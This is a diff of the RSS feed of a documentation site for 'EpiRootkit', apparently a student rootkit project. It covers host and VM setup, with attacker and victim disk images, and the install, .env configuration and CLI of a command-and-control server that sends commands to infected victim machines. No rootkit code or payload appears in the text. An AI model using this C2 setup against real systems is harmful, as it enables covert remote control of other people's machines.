@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Tux Fan Club Docs</title><link>/</link><description>Recent content on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Sat, 17 May 2025 01:31:21 +0200</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml"/><item><title>Presentation</title><link>/docs/01-introduction/presentation/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/01-introduction/presentation/</guid><description>&lt;h1 id="présentation">Présentation &lt;a href="#pr%c3%a9sentation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;h2 id="equipage">Equipage &lt;a href="#equipage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;div style="display: flex; justify-content: space-between; gap: 20px; flex-wrap: wrap;">
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Tux Fan Club Docs</title><link>/</link><description>Recent content on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Tue, 20 May 2025 02:00:08 +0200</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml"/><item><title>Presentation</title><link>/docs/01-introduction/presentation/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/01-introduction/presentation/</guid><description>&lt;h1 id="présentation">Présentation &lt;a href="#pr%c3%a9sentation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;h2 id="equipage">Equipage &lt;a href="#equipage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;div style="display: flex; justify-content: space-between; gap: 20px; flex-wrap: wrap;">
  &lt;div style="flex: 1; min-width: 250px; text-align: center;">
  &lt;strong>Capitaine&lt;/strong>: Hugo Sibony 
  &lt;br>
@@ -13,16 +13,29 @@
  
 &lt;h2 id="nom-de-léquipe">Nom de l&amp;rsquo;équipe &lt;a href="#nom-de-l%c3%a9quipe" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Nous sommes Tux Fan Club 🐧&lt;/p>
 &lt;p>C&amp;rsquo;est Léa qui a choisi le nom car c&amp;rsquo;est la seule personne du groupe un peu créative 👀&lt;/p>
-&lt;p>(Et par ce que Hugo est gentleman et a laissé le choix a la seule femme du groupe)&lt;/p></description></item><item><title>Initial Setup &amp; Installation</title><link>/docs/02-setup/environment/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/environment/</guid><description>&lt;p>To develop and test the rootkit, you need to prepare your host (EPITA laptop) with the following:&lt;/p>
-&lt;ol>
-&lt;li>
-&lt;p>Operating System&lt;/p>
-&lt;ul>
-&lt;li>Ubuntu 24.10 (amd64)&lt;/li>
-&lt;/ul>
-&lt;/li>
-&lt;li>
-&lt;p>Install virtualization and helper tools&lt;/p>
+&lt;p>(Et par ce que Hugo est gentleman et a laissé le choix a la seule femme du groupe)&lt;/p></description></item><item><title>Initial Setup &amp; Installation</title><link>/docs/02-setup/environment/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/environment/</guid><description>&lt;h1 id="host-environment-setup-from-a-blank-system">Host Environment Setup (from a Blank System) &lt;a href="#host-environment-setup-from-a-blank-system" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;blockquote>
+&lt;p>&lt;strong>Assumption:&lt;/strong> You are starting from a fresh Ubuntu 24.10 (amd64) install with no extra packages.&lt;/p>
+&lt;/blockquote>
+&lt;h2 id="1-update-system">1. Update System &lt;a href="#1-update-system" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="0e626b2" class="language-bash ">
+ &lt;code>sudo apt update &amp;amp;&amp;amp; sudo apt upgrade -y&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h2 id="2-install-essential-packages">2. Install Essential Packages &lt;a href="#2-install-essential-packages" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Install all required tools for virtualization, development, and Node.js:&lt;/p>
 
 
 
@@ -38,67 +51,15 @@
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="7b029c1" class="language-bash ">
- &lt;code>sudo apt update
-sudo apt install -y qemu-kvm libvirt-daemon-system libvirt-clients bridge-utils&lt;/code>
+ &lt;pre id="b8ce25f" class="language-bash ">
+ &lt;code>sudo apt install -y qemu-kvm libvirt-daemon-system libvirt-clients bridge-utils build-essential linux-headers-$(uname -r) curl git nodejs npm&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;/li>
-&lt;li>
-&lt;p>Enable and start the libvirt service&lt;/p>
-
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="c2c5800" class="language-bash ">
- &lt;code>sudo systemctl enable --now libvirtd&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;/li>
-&lt;li>
-&lt;p>Add your user to the &lt;code>libvirt&lt;/code> group (re-login or &lt;code>newgrp libvirt&lt;/code> afterward)&lt;/p>
-
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="2c827a4" class="language-bash ">
- &lt;code>sudo usermod -aG libvirt $USER&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;/li>
-&lt;li>
-&lt;p>Verify that KVM modules are loaded&lt;/p></description></item><item><title>VM Installation &amp; Verification</title><link>/docs/02-setup/vm-installation/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/vm-installation/</guid><description>&lt;div class="alert alert-info d-flex" role="alert">
- &lt;div class="flex-shrink-1 alert-icon">
- 
- &lt;span class="material-icons size-20 me-2">
- info
- &lt;/span>&lt;/div>
- 
- &lt;div class="w-100">Run &lt;code>./scripts/check_vms.sh&lt;/code> at any time to verify VM disks and ISO, and see download URLs for missing items.&lt;/div>
- &lt;/div>
-&lt;h2 id="vm-installation">VM Installation &lt;a href="#vm-installation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+&lt;blockquote>
+&lt;p>&lt;strong>Tip:&lt;/strong> If you get an error about missing kernel headers, ensure your kernel version matches the installed headers. Use &lt;code>uname -r&lt;/code> and &lt;code>apt search linux-headers&lt;/code> to check.&lt;/p></description></item><item><title>VM Installation &amp; Verification</title><link>/docs/02-setup/vm-installation/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/vm-installation/</guid><description>&lt;h1 id="virtual-machine-installation--verification">Virtual Machine Installation &amp;amp; Verification &lt;a href="#virtual-machine-installation--verification" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;blockquote>
+&lt;p>&lt;strong>You must have completed &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/02-setup/environment/'>&lt;p>SETUP&lt;/p>&lt;strong>Initial Setup &amp; Installation&lt;/strong>&lt;br>Prepare your host system from scratch for the EpiRootkit project.&lt;/a>" data-bs-toggle="tooltip" href="/docs/02-setup/environment/">Initial Setup &amp;amp; Installation&lt;/a> before proceeding.&lt;/strong>&lt;/p>
+&lt;/blockquote>
+&lt;h2 id="1-choose-your-vm-setup-method">1. Choose Your VM Setup Method &lt;a href="#1-choose-your-vm-setup-method" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
 &lt;nav>
 	&lt;div class="nav nav-tabs" id="nav-tab" role="tablist">
 
@@ -110,14 +71,14 @@ sudo apt install -y qemu-kvm libvirt-daemon-system libvirt-clients bridge-utils&
 		
 
 		&lt;a class="nav-link active"
-		 id="bdaecfTab" data-bs-toggle="tab" data-bs-target="#bdaecf"
-		 type="button" role="tab" aria-controls="bdaecf" aria-selected="true">Recommended: Pre-built Disks&lt;/a>
+		 id="edfbacTab" data-bs-toggle="tab" data-bs-target="#edfbac"
+		 type="button" role="tab" aria-controls="edfbac" aria-selected="true">Recommended: Pre-built Disks&lt;/a>
 
 		
 
 		&lt;a class="nav-link "
-		 id="fcbdaeTab" data-bs-toggle="tab" data-bs-target="#fcbdae"
-		 type="button" role="tab" aria-controls="fcbdae" aria-selected="true">Build Disks Yourself&lt;/a>
+		 id="feabcdTab" data-bs-toggle="tab" data-bs-target="#feabcd"
+		 type="button" role="tab" aria-controls="feabcd" aria-selected="true">Build Disks Yourself&lt;/a>
 
 		
 
@@ -134,35 +95,9 @@ sudo apt install -y qemu-kvm libvirt-daemon-system libvirt-clients bridge-utils&
 
 
 
-&lt;div class="tab-pane fade show active" id="bdaecf" role="tabpanel" aria-labelledby="nav-1">
+&lt;div class="tab-pane fade show active" id="edfbac" role="tabpanel" aria-labelledby="nav-1">
 
-	&lt;p>Download and place both QCOW2 images into the &lt;code>vm/&lt;/code> directory at the project root:&lt;/p>
-&lt;table>
- &lt;thead>
- &lt;tr>
- &lt;th>VM Disk&lt;/th>
- &lt;th>Path&lt;/th>
- &lt;th>Download URL&lt;/th>
- &lt;th>Size&lt;/th>
- &lt;/tr>
- &lt;/thead>
- &lt;tbody>
- &lt;tr>
- &lt;td>Attacker VM&lt;/td>
- &lt;td>&lt;code>vm/attacker.qcow2&lt;/code>&lt;/td>
- &lt;td>&lt;a href="https://drive.proton.me/urls/J20W6CD998#rB7b5oM6idQC" rel="external" target="_blank">https://drive.proton.me/urls/J20W6CD998#rB7b5oM6idQC&lt;svg width="16" height="16" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">&lt;path fill="currentColor" d="M14 5c-.552 0-1-.448-1-1s.448-1 1-1h6c.552 0 1 .448 1 1v6c0 .552-.448 1-1 1s-1-.448-1-1v-3.586l-7.293 7.293c-.391.39-1.024.39-1.414 0-.391-.391-.391-1.024 0-1.414l7.293-7.293h-3.586zm-9 2c-.552 0-1 .448-1 1v11c0 .552.448 1 1 1h11c.552 0 1-.448 1-1v-4.563c0-.552.448-1 1-1s1 .448 1 1v4.563c0 1.657-1.343 3-3 3h-11c-1.657 0-3-1.343-3-3v-11c0-1.657 1.343-3 3-3h4.563c.552 0 1 .448 1 1s-.448 1-1 1h-4.563z"/>&lt;/svg>&lt;/a>&lt;/td>
- &lt;td>5.6 Go&lt;/td>
- &lt;/tr>
- &lt;tr>
- &lt;td>Victim VM&lt;/td>
- &lt;td>&lt;code>vm/victim.qcow2&lt;/code>&lt;/td>
- &lt;td>&lt;a href="https://drive.proton.me/urls/EGVVVF6YXW#THevlby2e62E" rel="external" target="_blank">https://drive.proton.me/urls/EGVVVF6YXW#THevlby2e62E&lt;svg width="16" height="16" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">&lt;path fill="currentColor" d="M14 5c-.552 0-1-.448-1-1s.448-1 1-1h6c.552 0 1 .448 1 1v6c0 .552-.448 1-1 1s-1-.448-1-1v-3.586l-7.293 7.293c-.391.39-1.024.39-1.414 0-.391-.391-.391-1.024 0-1.414l7.293-7.293h-3.586zm-9 2c-.552 0-1 .448-1 1v11c0 .552.448 1 1 1h11c.552 0 1-.448 1-1v-4.563c0-.552.448-1 1-1s1 .448 1 1v4.563c0 1.657-1.343 3-3 3h-11c-1.657 0-3-1.343-3-3v-11c0-1.657 1.343-3 3-3h4.563c.552 0 1 .448 1 1s-.448 1-1 1h-4.563z"/>&lt;/svg>&lt;/a>&lt;/td>
- &lt;td>5.6 Go&lt;/td>
- &lt;/tr>
- &lt;/tbody>
-&lt;/table>
-&lt;blockquote>
-&lt;p>To be honest, these qcow2 images are almost identical. The only difference is that the rootkit files are pre-loaded on the &amp;lsquo;attacker&amp;rsquo; disk. If you prefer, you can simply download the &amp;lsquo;attacker&amp;rsquo; image and copy it into &lt;code>vm/victim.qcow2&lt;/code> if needed.&lt;/p></description></item><item><title>Attacking VM Setup</title><link>/docs/02-setup/attacking-vm-setup/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/attacking-vm-setup/</guid><description>&lt;p>Follow these steps once the host environment is ready and the VMs have been created or downloaded.&lt;/p>
+	&lt;h3 id="download-pre-built-images">Download Pre-built Images &lt;a href="#download-pre-built-images" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Download both QCOW2 images and place them in the &lt;code>vm/&lt;/code> directory at the project root:&lt;/p></description></item><item><title>Attacking VM Setup</title><link>/docs/02-setup/attacking-vm-setup/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/attacking-vm-setup/</guid><description>&lt;p>Follow these steps once the host environment is ready and the VMs have been created or downloaded.&lt;/p>
 &lt;h2 id="usage">Usage &lt;a href="#usage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ol>
 &lt;li>Ensure the &lt;code>attacker.qcow2&lt;/code> disk is in the &lt;code>vm/&lt;/code> directory (verify via &lt;code>./scripts/check_vms.sh&lt;/code> or see &lt;a href="/docs/02-setup/vm-installation/">VM Installation &amp;amp; Verification&lt;/a>).&lt;/li>
 &lt;li>Launch the attacking VM with:
@@ -270,44 +205,18 @@ Or both VMs with:
 &lt;/ul>
 &lt;/li>
 &lt;li>
-&lt;p>When finished, close the QEMU window or use &lt;strong>Ctrl+C&lt;/strong> on the host script to shut down both VMs.&lt;/p></description></item><item><title>Overview</title><link>/docs/03-attacking-program/overview/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/03-attacking-program/overview/</guid><description>&lt;p>The Attacking Program is the command and control (C2) server for EpiRootkit. It is designed to run on a Linux-based attacking virtual machine and provides a command-line interface (CLI) to manage and interact with EpiRootkit instances on victim machines.&lt;/p>
-&lt;p>Key functions include:&lt;/p>
-&lt;ul>
-&lt;li>Listening for client connections from EpiRootkit instances.&lt;/li>
-&lt;li>Securing communication using AES-256-GCM encryption.&lt;/li>
-&lt;li>Authenticating clients based on a SHA512 hashed password.&lt;/li>
-&lt;li>Managing connected clients (listing, identifying).&lt;/li>
-&lt;li>Providing an interactive CLI for sending commands to EpiRootkit instances.&lt;/li>
-&lt;/ul></description></item><item><title>Installation</title><link>/docs/03-attacking-program/installation/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/03-attacking-program/installation/</guid><description>&lt;p>To run the Attacking Program (C2 Server):&lt;/p>
-&lt;h2 id="prerequisites">Prerequisites &lt;a href="#prerequisites" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
-&lt;li>&lt;strong>Node.js &amp;amp; npm&lt;/strong>: Ensure Node.js (e.g., LTS v18.x+) and npm are installed.
-
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="685c214" class="language-bash ">
- &lt;code>sudo apt update &amp;amp;&amp;amp; sudo apt install nodejs npm&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;/li>
+&lt;p>When finished, close the QEMU window or use &lt;strong>Ctrl+C&lt;/strong> on the host script to shut down both VMs.&lt;/p></description></item><item><title>Overview</title><link>/docs/03-attacking-program/overview/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/03-attacking-program/overview/</guid><description>&lt;h2 id="todo-implement-additional-c2-server-features">TODO: Implement Additional C2 Server Features &lt;a href="#todo-implement-additional-c2-server-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
+&lt;li>&lt;input disabled="" type="checkbox"> Add advanced client management (aliasing, grouping)&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Implement encrypted web UI integration&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Add audit logging and event history&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Implement advanced command scheduling&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Add more robust error handling and reporting&lt;/li>
 &lt;/ul>
-&lt;h2 id="setup">Setup &lt;a href="#setup" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ol>
-&lt;li>
-&lt;p>Navigate to the &lt;code>attacking_program&lt;/code> directory within the project.&lt;/p>
-&lt;/li>
-&lt;li>
-&lt;p>Install Dependencies:&lt;/p>
+&lt;p>&lt;em>This section will be updated with documentation once features are implemented and tested.&lt;/em>&lt;/p>
+&lt;p>The Attacking Program is the command and control (C2) server for EpiRootkit. It is designed to run on a Linux-based attacking virtual machine and provides a command-line interface (CLI) to manage and interact with EpiRootkit instances on victim machines.&lt;/p></description></item><item><title>Installation</title><link>/docs/03-attacking-program/installation/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/03-attacking-program/installation/</guid><description>&lt;h1 id="attacking-program-c2-server-installation">Attacking Program (C2 Server) Installation &lt;a href="#attacking-program-c2-server-installation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;blockquote>
+&lt;p>&lt;strong>Assumption:&lt;/strong> You are starting from a fresh Ubuntu system. Complete &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/02-setup/environment/'>&lt;p>SETUP&lt;/p>&lt;strong>Initial Setup &amp; Installation&lt;/strong>&lt;br>Prepare your host system from scratch for the EpiRootkit project.&lt;/a>" data-bs-toggle="tooltip" href="/docs/02-setup/environment/">Host Environment Setup&lt;/a> and &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/02-setup/vm-installation/'>&lt;p>SETUP&lt;/p>&lt;strong>VM Installation &amp; Verification&lt;/strong>&lt;br>Set up and verify the attacker and victim VMs from scratch.&lt;/a>" data-bs-toggle="tooltip" href="/docs/02-setup/vm-installation/">VM Installation&lt;/a> first.&lt;/p>
+&lt;/blockquote>
+&lt;h2 id="1-install-nodejs-npm-and-pnpm">1. Install Node.js, npm, and pnpm &lt;a href="#1-install-nodejs-npm-and-pnpm" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>If not already installed, run:&lt;/p>
 
 
 
@@ -323,13 +232,65 @@ Or both VMs with:
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="e3453dc" class="language-bash ">
- &lt;code>npm install&lt;/code>
+ &lt;pre id="3f389ed" class="language-bash ">
+ &lt;code>sudo apt update
+sudo apt install -y nodejs npm
+sudo npm install -g pnpm&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;/li>
-&lt;li>
-&lt;p>Review Critical Configuration: Before first use, ensure you have reviewed and appropriately set the &lt;code>ENCRYPTION_KEY&lt;/code>, &lt;code>PASSWORD_HASH&lt;/code>, and &lt;code>C2_PORT&lt;/code>. Refer to the &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/03-attacking-program/configuration/'>&lt;p>ATTACKING PROGRAM (C2 SERVER)&lt;/p></description></item><item><title>Usage &amp; CLI Commands</title><link>/docs/03-attacking-program/usage/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/03-attacking-program/usage/</guid><description>&lt;h2 id="running-the-server">Running the Server &lt;a href="#running-the-server" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>In the &lt;code>attacking_program&lt;/code> directory, run:&lt;/p>
+&lt;blockquote>
+
+&lt;div class="alert alert-info d-flex" role="alert">
+ &lt;div class="flex-shrink-1 alert-icon">
+ 
+ &lt;span class="material-icons size-20 me-2">
+ info
+ &lt;/span>&lt;/div>
+ 
+ &lt;div class="w-100">Check your versions: Node.js v18+ and pnpm v8+ are recommended. Use &lt;code>node -v&lt;/code> and &lt;code>pnpm -v&lt;/code> to verify.&lt;/div>
+ &lt;/div>
+&lt;/blockquote>
+&lt;h2 id="2-navigate-to-the-attacking-program-directory">2. Navigate to the Attacking Program Directory &lt;a href="#2-navigate-to-the-attacking-program-directory" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="1998761" class="language-bash ">
+ &lt;code>cd attacking_program&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h2 id="3-install-dependencies">3. Install Dependencies &lt;a href="#3-install-dependencies" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="b879665" class="language-bash ">
+ &lt;code>pnpm install
+# Or, if you prefer npm:
+npm install&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h2 id="4-prepare-configuration">4. Prepare Configuration &lt;a href="#4-prepare-configuration" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>The C2 server is configured via a &lt;code>.env&lt;/code> file. &lt;strong>You must set strong, secure values!&lt;/strong>&lt;/p></description></item><item><title>Usage &amp; CLI Commands</title><link>/docs/03-attacking-program/usage/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/03-attacking-program/usage/</guid><description>&lt;h2 id="running-the-server">Running the Server &lt;a href="#running-the-server" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>In the &lt;code>attacking_program&lt;/code> directory, run:&lt;/p>
 
 
 
@@ -345,19 +306,14 @@ Or both VMs with:
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="721ccab" class="language-bash ">
- &lt;code>npm start&lt;/code>
+ &lt;pre id="ef539d5" class="language-bash ">
+ &lt;code>pnpm start
+# Or
+npm start&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;p>The server starts automatically and presents the &lt;code>c2-server$ &lt;/code> prompt. Real-time event logs appear in the console, providing visual alerts for significant events such as client connections and disconnections.&lt;/p>
-&lt;h2 id="cli-commands">CLI Commands &lt;a href="#cli-commands" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
-
-
-
-
-
-
-&lt;table class="table %!s(&lt;nil>)">
+&lt;p>The server starts automatically and presents the &lt;code>c2-server$ &lt;/code> prompt. Real-time event logs appear in the console.&lt;/p>
+&lt;h2 id="cli-commands">CLI Commands &lt;a href="#cli-commands" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;table>
  &lt;thead>
  &lt;tr>
  &lt;th>Command&lt;/th>
@@ -369,7 +325,7 @@ Or both VMs with:
  &lt;tr>
  &lt;td>&lt;code>server start&lt;/code>&lt;/td>
  &lt;td>&lt;code>start&lt;/code>&lt;/td>
- &lt;td>Starts TCP server (Note: auto-starts with &lt;code>npm start&lt;/code>).&lt;/td>
+ &lt;td>Starts TCP server (auto-starts with &lt;code>pnpm start&lt;/code>).&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>&lt;code>server stop&lt;/code>&lt;/td>
@@ -393,32 +349,14 @@ Or both VMs with:
  &lt;/tr>
  &lt;/tbody>
 &lt;/table>
-
 &lt;ul>
 &lt;li>&lt;code>&amp;lt;clientAlias&amp;gt;&lt;/code>: Target client alias (e.g., &lt;code>Client-1&lt;/code> from &lt;code>clients list&lt;/code>).&lt;/li>
 &lt;li>&lt;code>&amp;lt;command...&amp;gt;&lt;/code>: Command string for the victim machine.&lt;/li>
 &lt;/ul>
-&lt;p>Event logs provide feedback on connections, authentication attempts, data exchanges, errors, and command results. When a command is executed on a rootkit and results (such as stdout, stderr, or exit status) are sent back, they will be displayed in these logs.&lt;/p></description></item><item><title>Configuration</title><link>/docs/03-attacking-program/configuration/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/03-attacking-program/configuration/</guid><description>&lt;p>The C2 server is configured via &lt;code>src/config/index.js&lt;/code> or environment variables.&lt;/p>
-&lt;h2 id="critical-settings">Critical Settings &lt;a href="#critical-settings" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
-&lt;li>
-&lt;p>&lt;code>C2_PORT&lt;/code> (Default: &lt;code>4444&lt;/code> | Env: &lt;code>C2_PORT&lt;/code>)&lt;/p>
-&lt;ul>
-&lt;li>TCP port for EpiRootkit connections.&lt;/li>
-&lt;/ul>
-&lt;/li>
-&lt;li>
-&lt;p>&lt;code>ENCRYPTION_KEY&lt;/code> (Default: &lt;code>mysecretkey...&lt;/code> (32 bytes) | Env: &lt;code>ENCRYPTION_KEY&lt;/code>)&lt;/p>
-&lt;ul>
-&lt;li>Must be a 32-byte string for AES-256-GCM.&lt;/li>
-&lt;li>Crucial for security: Change the default to a strong, random key.&lt;/li>
-&lt;li>Must match the key on EpiRootkit clients.&lt;/li>
-&lt;/ul>
-&lt;/li>
-&lt;li>
-&lt;p>&lt;code>PASSWORD_HASH&lt;/code> (Default: SHA512 hash of &lt;code>&amp;quot;password&amp;quot;&lt;/code> | Env: &lt;code>PASSWORD_HASH&lt;/code>)&lt;/p>
-&lt;ul>
-&lt;li>Must be a 128-char lowercase SHA512 hex string.&lt;/li>
-&lt;li>Crucial for security: Change the default. Use a strong password and hash it:
+&lt;p>Event logs provide feedback on connections, authentication attempts, data exchanges, errors, and command results. When a command is executed on a rootkit and results (such as stdout, stderr, or exit status) are sent back, they will be displayed in these logs.&lt;/p></description></item><item><title>Configuration</title><link>/docs/03-attacking-program/configuration/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/03-attacking-program/configuration/</guid><description>&lt;h1 id="c2-server-configuration">C2 Server Configuration &lt;a href="#c2-server-configuration" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;blockquote>
+&lt;p>&lt;strong>You must configure the C2 server before first use.&lt;/strong>&lt;/p>
+&lt;/blockquote>
+&lt;h2 id="1-configuration-file-env">1. Configuration File: &lt;code>.env&lt;/code> &lt;a href="#1-configuration-file-env" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>All critical settings are loaded from a &lt;code>.env&lt;/code> file in the &lt;code>attacking_program/&lt;/code> directory. If you haven&amp;rsquo;t already, copy the example:&lt;/p>
 
 
 
@@ -434,31 +372,49 @@ Or both VMs with:
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="6a74c81" class="language-bash ">
- &lt;code># Example to generate hash for a new password:
-echo -n &amp;#34;your_new_strong_password&amp;#34; | sha512sum | awk &amp;#39;{print $1}&amp;#39;&lt;/code>
+ &lt;pre id="90df811" class="language-bash ">
+ &lt;code>cp .env.example .env&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;/li>
+&lt;p>Open &lt;code>.env&lt;/code> in your editor and set the following:&lt;/p>
+&lt;h3 id="required-settings">Required Settings &lt;a href="#required-settings" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
+&lt;li>&lt;code>C2_PORT&lt;/code> — TCP port for EpiRootkit connections (default: 4444)&lt;/li>
+&lt;li>&lt;code>ENCRYPTION_KEY&lt;/code> — &lt;strong>Must be a 32-byte (256-bit) random string&lt;/strong>&lt;/li>
+&lt;li>&lt;code>PASSWORD_HASH&lt;/code> — &lt;strong>Must be a 128-character lowercase SHA512 hex string&lt;/strong>&lt;/li>
 &lt;/ul>
-&lt;/li>
+&lt;h3 id="how-to-generate-secure-values">How to Generate Secure Values &lt;a href="#how-to-generate-secure-values" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;h4 id="generate-a-32-byte-encryption_key">Generate a 32-byte ENCRYPTION_KEY &lt;a href="#generate-a-32-byte-encryption_key" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h4>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="c1c24f1" class="language-bash ">
+ &lt;code>head -c 32 /dev/urandom | base64 | head -c 32&lt;/code>
+ &lt;/pre>
+ &lt;/div>
